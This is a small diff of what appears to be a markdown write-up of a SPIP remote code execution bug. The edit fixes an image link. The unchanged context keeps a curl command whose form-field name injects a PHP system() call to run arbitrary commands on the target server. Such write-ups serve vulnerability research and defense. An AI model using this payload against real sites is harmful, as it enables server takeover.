@@ -498,7 +498,7 @@ final_payload="formulaire_action=oubli&formulaire_action_args=$formulaire_action
 curl -ki -X POST -F "RCE['.system('$cmd').die().'][][ll]=@foo.txt" "$base_url&$final_payload"
 ```
 
-[rce](./img/spip-rce.png)
+![rce](./img/spip-rce.png)
 
 Vozec also made a python script for the same bug:
 
